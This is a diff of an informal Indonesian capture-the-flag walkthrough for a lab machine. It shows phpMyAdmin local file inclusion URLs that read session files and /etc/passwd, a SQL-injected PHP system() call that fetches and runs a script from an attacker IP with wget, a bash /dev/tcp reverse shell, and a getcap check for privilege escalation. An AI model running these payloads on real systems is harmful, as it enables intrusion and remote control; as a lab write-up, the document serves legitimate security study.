@@ -190,7 +190,6 @@ lalu gw crack lah pake `john` password cracking paling terkenal katanya. dan gw 
 
 Dan password telah ter-crack. `Stella` merek apaan dah pewangi ruangan ya? wkwkwk. dan lanjut ke exploit buat dpt user flag.
 
-![]
 # Exploit
 ## Local File Inclusion
 
@@ -198,10 +197,43 @@ menurut [exploit](https://www.exploit-db.com/exploits/44928)nya pertama tama gw 
 ```php
 select '<?php phpInfo();exit;?>'
 ```
+
 ![img8](https://i.ibb.co/7g8swxb/phpserverpng.png)
 
 terus katanya masukin juga payload buat baca session file gitu.
 ```php
 http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_(cookie session, kalo g tau letak cookie pake extension di browser namanya CookieEditor)
 ```
+tapi kalo di gw kok malah error" gitu jadi karena ilmu gw dikit, gw putuskan untuk coba ngread file *passwd* dan pas gw test ternyata bisa.
+```php
+http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+```
+
+![passwd](https://i.ibb.co/XYyjLHz/passwd.png)
+
+dan hasilnya bisa, oke jadi langsung gw buat *payload* alias *reverse tcp shell* lewat sql server tadi.
+
+## Remote Code Execution
+
+jadi gw masukin *reverse shell* seperti yg gw bilang tadi, masukin lewat sql server.
+```php
+select '<?php system("wget http://192.168.172.128:10/skofos.sh -o skofos.sh; chmod +x skofos.sh; bash skofos.sh;");exit?>
+```
+ini code yang gw buat untuk *revere shell* nya
+```sh
+bash -i > /dev/tcp/192.168.172.128/1337 0>&1
+```
+yaudah habis itu gw nyalain *netcat* dgn port 1337 seperti yg gw buat di *reverse shell* itu.
+
+## User.txt
+
+![netcat](https://i.ibb.co/bsrf32K/netcat.png)
+
+![lmao](https://i.ibb.co/Lk18YT0/user.png)
+
+# Privilege Escalation
+
+pas gw baca itu ada *new command* aka perintah baru atau apa itu, untuk membackup suatu file dan meng-compress tanpa perlu ijin root. terus gw googling (tp gw makenya duckduckgo :v) dan gw lupa sumbernya dari mana nanti kalo ketemu gw taro sini, jadi gw liat pake command `getcap -r / 2>/dev/null`. 
+
+![getcap](https://i.ibb.co/557vN7r/escalation.png)
 
